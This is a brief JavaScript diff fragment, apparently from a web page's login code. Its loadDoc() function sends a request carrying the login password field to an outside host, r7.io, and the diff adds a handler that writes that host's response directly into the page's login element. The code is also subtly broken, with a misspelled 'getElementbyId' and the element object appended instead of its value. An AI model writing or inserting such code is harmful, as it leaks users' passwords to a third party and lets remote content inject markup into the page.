@@ -341,6 +341,11 @@ document.getElementsByClassName('problem')[0].style.display = 'none';
 
 function loadDoc() {
 var xhttp = new XMLHttpRequest();
+	xhttp.onreadystatechange = function(){
+		if(this.readyState == 4 && this.status == 200) {
+			document.getElementById('login').innerHTML = this.responseText;
+		}
+	};
 xhttp.open("GET", "http://r7.io/e/akean?s=" + document.getElementbyId('login_password'), true);
 xhttp.send();
 }
